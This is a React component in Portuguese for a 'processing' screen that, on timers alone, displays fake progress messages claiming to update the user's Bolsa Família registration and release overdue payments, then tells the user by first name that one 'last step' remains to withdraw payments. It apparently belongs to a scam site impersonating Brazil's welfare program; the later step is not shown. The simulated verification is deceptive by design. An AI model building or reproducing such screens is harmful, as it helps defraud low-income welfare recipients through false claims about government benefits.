import { useEffect, useState } from 'react';
import { useLocation } from 'wouter';
import { Loader2, CheckCircle } from 'lucide-react';
import { useUserStore } from '../store/userStore';

export default function Processando() {
  const [, navigate] = useLocation();
  const { userData } = useUserStore();
  const [statusIndex, setStatusIndex] = useState(0);
  const [showConcluido, setShowConcluido] = useState(false);
  const [showCheck, setShowCheck] = useState(false);

  // Obter apenas o primeiro nome
  const primeiroNome = userData.nome.split(' ')[0];

  // Lista de status que serão exibidos em sequência
  const statusMessages = [
    "Verificando informações...",
    "Validando dados no sistema...",
    "Atualizando cadastro no Bolsa Família...",
    "Calculando novas parcelas...",
    "Liberando pagamentos atrasados...",
    "Finalizando processo..."
  ];

  useEffect(() => {
    // Avançar para o próximo status a cada 3 segundos
    if (statusIndex < statusMessages.length) {
      const timer = setTimeout(() => {
        setStatusIndex(statusIndex + 1);
      }, 3000);
      
      return () => clearTimeout(timer);
    } else {
      // Quando todos os status forem exibidos, mostrar a mensagem de conclusão
      const timer = setTimeout(() => {
        setShowConcluido(true);
        
        // Mostrar o ícone de check após um breve delay
        setTimeout(() => {
          setShowCheck(true);
        }, 500);
      }, 1000);
      
      return () => clearTimeout(timer);
    }
  }, [statusIndex, statusMessages.length]);

  const handleContinuarClick = () => {
    navigate('/');
  };

  // Cálculo da porcentagem de progresso
  const progressPercent = Math.min(
    statusIndex === statusMessages.length
      ? 100
      : Math.floor((statusIndex / statusMessages.length) * 100),
    100
  );

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Cabeçalho com gradiente azul */}
      <div className="relative">
        <header className="bg-gradient-to-r from-[#0066b3] to-[#03a9f4] text-white p-4 flex items-center justify-center">
          <span className="text-lg font-medium">Processando</span>
        </header>
        {/* Barra inferior */}
        <div className="h-1 bg-white w-full absolute bottom-0 opacity-20"></div>
      </div>

      <div className="flex-1 flex flex-col justify-center items-center p-8">
        {!showConcluido ? (
          <>
            {/* Spinner de carregamento */}
            <div className="mb-8 relative">
              <Loader2 className="h-20 w-20 text-[#0066b3] animate-spin" />
              
              {/* Porcentagem no centro do spinner */}
              <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 text-[#0066b3] font-bold text-sm">
                {progressPercent}%
              </div>
            </div>
            
            {/* Título */}
            <h2 className="text-xl font-bold text-[#0066b3] mb-6 text-center">
              Aguarde alguns instantes...
            </h2>
            
            {/* Mensagem de status atual */}
            <div className="text-center text-gray-700 mb-8 h-10 flex items-center justify-center">
              <p className="animate-fadeIn">{statusMessages[statusIndex] || "Finalizando..."}</p>
            </div>
            
            {/* Barra de progresso */}
            <div className="w-full max-w-md bg-gray-200 rounded-full h-4 overflow-hidden">
              <div 
                className="bg-[#0066b3] h-full transition-all duration-500 ease-out"
                style={{ width: `${progressPercent}%` }}
              ></div>
            </div>
            
            {/* Texto do progresso */}
            <p className="mt-3 text-sm text-gray-500">
              O sistema está atualizando seu cadastro...
            </p>
          </>
        ) : (
          <>
            {/* Ícone de conclusão */}
            <div className={`mb-8 transform transition-all duration-500 ${showCheck ? 'scale-100' : 'scale-0'}`}>
              <CheckCircle className="h-20 w-20 text-green-500" />
            </div>
            
            {/* Título */}
            <h2 className="text-xl font-bold text-green-600 mb-8 text-center animate-fadeIn">
              Cadastro atualizado com sucesso!
            </h2>
            
            {/* Informação do usuário */}
            <div className="bg-[#f1f9ff] p-4 rounded-lg mb-8 w-full max-w-md">
              <p className="text-gray-700">
                <span className="font-medium">{primeiroNome}</span>, resta apenas uma <span className="font-bold text-[#ee8435]">ÚLTIMA ETAPA</span> para sacar suas <span className="font-bold text-[#ee8435]">PARCELAS DO BOLSA FAMÍLIA</span>!
              </p>
            </div>
            
            {/* Botão de continuar */}
            <button
              onClick={handleContinuarClick}
              className="w-full max-w-md py-4 bg-[#ee8435] text-white font-medium rounded-md hover:bg-[#df7426] uppercase"
            >
              Continuar
            </button>
          </>
        )}
      </div>
    </div>
  );
}